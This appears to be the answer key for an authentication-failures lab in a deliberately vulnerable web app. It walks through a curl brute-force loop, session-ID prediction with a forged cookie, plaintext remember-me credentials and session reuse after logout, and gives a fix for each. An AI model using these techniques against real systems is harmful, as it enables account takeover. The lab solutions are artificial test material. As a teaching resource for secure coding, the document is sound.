# A07 – Authentication Failures: Solutions

## Challenge 1 – Brute Force
No rate limiting or lockout exists. Script a wordlist:
```bash
for pw in password 123456 sunshine admin123 qwerty iloveyou; do
  result=$(curl -s -X POST http://localhost:5000/a07/login \
    -d "username=alice&password=$pw")
  echo "$pw: $(echo $result | grep -o 'SUCCESS\|fail')"
done
```
`alice`'s password is `sunshine`.

**Fix:** Implement account lockout (e.g., 5 attempts → 15 min lock) or exponential backoff.
Use `flask-limiter` for rate limiting.

## Challenge 2 – Session Prediction
Login multiple times and observe that `session_id` is a sequential integer (1, 2, 3...).
Set the cookie manually:
```bash
curl -b "session_id=1" http://localhost:5000/a07/profile
```
This returns the profile of whoever has session #1 — even if you logged in as someone else.

**Fix:** Use `secrets.token_hex(32)` for session tokens. Never use sequential IDs.

## Challenge 3 – Remember Me Cookie
Login with "Remember me" checked. Inspect the cookie:
```
remember_me=alice:sunshine
```
Plaintext credentials stored in the browser. Anyone with cookie access has the password.

**Fix:** Store a random token server-side mapped to the user. Never store credentials in cookies.

## Challenge 4 – Logout Doesn't Invalidate
1. Login → note `session_id=N`
2. Logout (cookie deleted from browser)
3. Re-send request with `Cookie: session_id=N` → still authenticated!

The `_sessions` dict was never cleared on logout.

**Fix:**
```python
@a07.route('/logout')
def logout():
    sid = request.cookies.get('session_id')
    if sid and sid.isdigit():
        _sessions.pop(int(sid), None)  # invalidate server-side
    resp = make_response(redirect(url_for('a07.index')))
    resp.delete_cookie('session_id')
    return resp
```
